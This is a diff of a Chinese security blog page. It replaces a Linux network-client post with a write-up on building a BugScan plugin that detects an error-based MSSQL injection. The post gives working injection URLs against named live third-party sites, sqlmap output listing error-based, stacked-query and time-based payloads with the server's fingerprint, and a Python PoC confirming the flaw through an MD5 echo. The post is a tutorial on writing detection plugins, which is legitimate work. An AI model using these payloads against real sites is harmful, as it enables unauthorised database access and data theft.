@@ -73,6 +73,8 @@
 
 
 
+  
+
 
   <link rel="alternate" href="/atom.xml" title="ZEROYU" type="application/atom+xml" />
 
@@ -86,24 +88,25 @@
 
 
 
-<meta name="description" content="其实很简单一个命令就搞定（前提是你有这个脚本）
-12345678910111213#下载之后先解压：unzip RuijieForLinux.zip#之后cd 进去#在然后呢sudo chmod +x ./rjsupplicant.sh#再然后呢sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源
-第一次使用时，可以通过 –help命令查看使用帮助">
+<meta name="description" content="最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……
+下面就让我们看看这个题目：
+某通用平台被曝出有一处高危注入，以下为详情：
+1http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;amp;Rela">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux下使用锐捷的方法">
-<meta property="og:url" content="http://zer0yu.github.io/2017/01/22/Linux下使用锐捷的方法/index.html">
+<meta property="og:title" content="BugScan插件编写">
+<meta property="og:url" content="http://zer0yu.github.io/2017/01/22/BugScan插件编写/index.html">
 <meta property="og:site_name" content="ZEROYU">
-<meta property="og:description" content="其实很简单一个命令就搞定（前提是你有这个脚本）
-12345678910111213#下载之后先解压：unzip RuijieForLinux.zip#之后cd 进去#在然后呢sudo chmod +x ./rjsupplicant.sh#再然后呢sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源
-第一次使用时，可以通过 –help命令查看使用帮助">
-<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/linux-rj.png">
-<meta property="og:updated_time" content="2017-01-22T02:48:08.000Z">
+<meta property="og:description" content="最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……
+下面就让我们看看这个题目：
+某通用平台被曝出有一处高危注入，以下为详情：
+1http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;amp;Rela">
+<meta property="og:updated_time" content="2017-01-22T03:26:20.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux下使用锐捷的方法">
-<meta name="twitter:description" content="其实很简单一个命令就搞定（前提是你有这个脚本）
-12345678910111213#下载之后先解压：unzip RuijieForLinux.zip#之后cd 进去#在然后呢sudo chmod +x ./rjsupplicant.sh#再然后呢sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源
-第一次使用时，可以通过 –help命令查看使用帮助">
-<meta name="twitter:image" content="http://ok44mzy2k.bkt.clouddn.com/linux-rj.png">
+<meta name="twitter:title" content="BugScan插件编写">
+<meta name="twitter:description" content="最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……
+下面就让我们看看这个题目：
+某通用平台被曝出有一处高危注入，以下为详情：
+1http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;amp;Rela">
 
 
 
@@ -131,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://zer0yu.github.io/2017/01/22/Linux下使用锐捷的方法/"/>
+  <link rel="canonical" href="http://zer0yu.github.io/2017/01/22/BugScan插件编写/"/>
 
 
 
 
 
-  <title> Linux下使用锐捷的方法 | ZEROYU </title>
+  <title> BugScan插件编写 | ZEROYU </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -303,7 +306,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Linux下使用锐捷的方法/">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/BugScan插件编写/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="ZEROYU">
@@ -327,7 +330,7 @@
             
             
               
-                Linux下使用锐捷的方法
+                BugScan插件编写
               
             
           </h1>
@@ -342,7 +345,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:45:46+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:23:35+08:00">
                 2017-01-22
               </time>
             
@@ -361,8 +364,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/01/22/Linux下使用锐捷的方法/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/Linux下使用锐捷的方法/" itemprop="commentCount"></span>
+                <a href="/2017/01/22/BugScan插件编写/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/BugScan插件编写/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -372,7 +375,7 @@
 
           
           
-             <span id="/2017/01/22/Linux下使用锐捷的方法/" class="leancloud_visitors" data-flag-title="Linux下使用锐捷的方法">
+             <span id="/2017/01/22/BugScan插件编写/" class="leancloud_visitors" data-flag-title="BugScan插件编写">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -399,11 +402,25 @@
       
 
       
-        <p>其实很简单一个命令就搞定（前提是你有这个<a href="https://pan.baidu.com/s/1bo13wYF" target="_blank" rel="external">脚本</a>）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#下载之后先解压：</div><div class="line"></div><div class="line">unzip RuijieForLinux.zip</div><div class="line"></div><div class="line">#之后cd 进去</div><div class="line"></div><div class="line">#在然后呢</div><div class="line"></div><div class="line">sudo chmod +x ./rjsupplicant.sh</div><div class="line"></div><div class="line">#再然后呢</div><div class="line"></div><div class="line">sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源</div></pre></td></tr></table></figure>
-<p>第一次使用时，可以通过 –help命令查看使用帮助文档</p>
-<p>贴个效果图：</p>
-<p><img src="http://ok44mzy2k.bkt.clouddn.com/linux-rj.png" alt="1"></p>
+        <p>最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……</p>
+<p>下面就让我们看看这个题目：</p>
+<p>某通用平台被曝出有一处高危注入，以下为详情：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>www.exploit.com<span class="regexp">/livefiles/</span>pages<span class="regexp">/inner/u</span>serlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=<span class="number">1</span></div></pre></td></tr></table></figure>
+<p>userName处为一处报错注入，</p>
+<p>请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，<br>要求测试该脚本必须使用多个目标站点。<br>以下为两个测试站点（请勿做除测试之外的任何危险动作）</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//www.jmsyzx.com/</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//www.globechildren.com/</span></div></pre></td></tr></table></figure>
+<p>哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。</p>
+<p>看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=@<span class="title">@version--</span></div></pre></td></tr></table></figure>
+<p>也可以sqlmap跑一下看看：</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[<span class="name">22:07:32</span>] [<span class="name">INFO</span>] resuming back-end DBMS <span class="symbol">'microsoft</span> sql server'</div><div class="line">[<span class="name">22:07:32</span>] [<span class="name">INFO</span>] testing connection to the target URL</div><div class="line">sqlmap resumed the following injection point(<span class="name">s</span>) from stored session:</div><div class="line">---</div><div class="line">Parameter: userName (<span class="name">GET</span>)</div><div class="line">Type: error-based</div><div class="line">Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1' AND <span class="number">2390</span>=CONVERT(<span class="name">INT</span>,(<span class="name">SELECT</span> CHAR(<span class="name">113</span>)+CHAR(<span class="name">107</span>)+CHAR(<span class="name">98</span>)+CHAR(<span class="name">113</span>)+CHAR(<span class="name">113</span>)+(<span class="name">SELECT</span> (<span class="name">CASE</span> WHEN (<span class="name">2390=2390</span>) THEN CHAR(<span class="name">49</span>) ELSE CHAR(<span class="name">48</span>) END))+CHAR(<span class="name">113</span>)+CHAR(<span class="name">98</span>)+CHAR(<span class="name">112</span>)+CHAR(<span class="name">118</span>)+CHAR(<span class="name">113</span>))) AND <span class="symbol">'nTAv</span><span class="symbol">'=</span><span class="symbol">'nTAv</span></div><div class="line">Type: stacked queries</div><div class="line">Title: Microsoft SQL Server/Sybase stacked queries (<span class="name">comment</span>)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1'<span class="comment">;WAITFOR DELAY '0:0:5'--</span></div><div class="line">Type: AND/OR time-based blind</div><div class="line">Title: Microsoft SQL Server/Sybase time-based blind (<span class="name">comment</span>)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1' WAITFOR DELAY <span class="symbol">'0:0:5</span><span class="symbol">'--</span></div><div class="line">---</div><div class="line">[<span class="name">22:07:33</span>] [<span class="name">INFO</span>] the back-end DBMS is Microsoft SQL Server</div><div class="line">web server operating system: Windows <span class="number">2008</span> R2 or <span class="number">7</span></div><div class="line">web application technology: ASP.NET, Microsoft IIS <span class="number">7.5</span></div><div class="line">back-end DBMS: Microsoft SQL Server <span class="number">2005</span></div><div class="line">[<span class="name">22:07:33</span>] [<span class="name">INFO</span>] fetched data logged to text files under <span class="symbol">'C:</span>\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com'</div></pre></td></tr></table></figure>
+<p>别多看看那个GET就行了，GET最简单了。<br>我们就抓住报错跟打印MD5这两点就行了。</p>
+<p>打印MD5呢，mssql有两种方式：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=sys.fn_sqlvarbasetostr(HashBytes(<span class="symbol">%27</span>MD<span class="number">5</span><span class="symbol">%27</span>,<span class="symbol">%27123456</span><span class="symbol">%27</span>))--</div><div class="line"></div><div class="line"><span class="number">2</span>.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=sys.fn_varbintohexstr(hashbytes(<span class="symbol">%27</span>MD<span class="number">5</span><span class="symbol">%27</span>,<span class="symbol">%271234</span><span class="symbol">%27</span>))--</div></pre></td></tr></table></figure>
+<p>直接上我写的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/evn python</span></div><div class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></div><div class="line"><span class="string">"""</span></div><div class="line">POC Name : 泡妹专享</div><div class="line">Author : zeroyu</div><div class="line">mail : zeroyu.xyz@gmail.com</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line"><span class="keyword">if</span> service == <span class="string">'fingerprint.girl'</span>:</div><div class="line"><span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">payload = <span class="string">"/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"</span></div><div class="line">url = arg + payload</div><div class="line">code, head, res, errcode, _ = hackhttp.http(url)</div><div class="line">time.sleep(<span class="number">1</span>)</div><div class="line"><span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">'81dc9bdb52d04dc20036dbd8313ed055'</span> <span class="keyword">in</span> res:</div><div class="line">security_hole(url)</div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line"><span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">audit(assign(<span class="string">'fingerprint.girl'</span>,<span class="string">'http://www.jmsyzx.com/'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure>
+<p>是不是想问我hackhttp是个什么库，看<a href="http://doc.bugscan.net/" target="_blank" rel="external">文档</a>去。</p>
+<p>好，今天妹子就泡到这儿。</p>
 
       
     </div>
@@ -430,8 +447,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/01/22/Weblogic-SSRF/" rel="next" title="Weblogic_SSRF">
-                <i class="fa fa-chevron-left"></i> Weblogic_SSRF
+              <a href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" rel="next" title="POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT">
+                <i class="fa fa-chevron-left"></i> POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT
               </a>
             
           </div>
@@ -439,10 +456,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/01/22/PyCharm2016-2专业版注册码/" rel="prev" title="PyCharm2016.2专业版注册码">
-                PyCharm2016.2专业版注册码 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -468,8 +481,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2017/01/22/Linux下使用锐捷的方法/"
-           data-title="Linux下使用锐捷的方法" data-url="http://zer0yu.github.io/2017/01/22/Linux下使用锐捷的方法/">
+      <div class="ds-thread" data-thread-key="2017/01/22/BugScan插件编写/"
+           data-title="BugScan插件编写" data-url="http://zer0yu.github.io/2017/01/22/BugScan插件编写/">
       </div>
     
   </div>
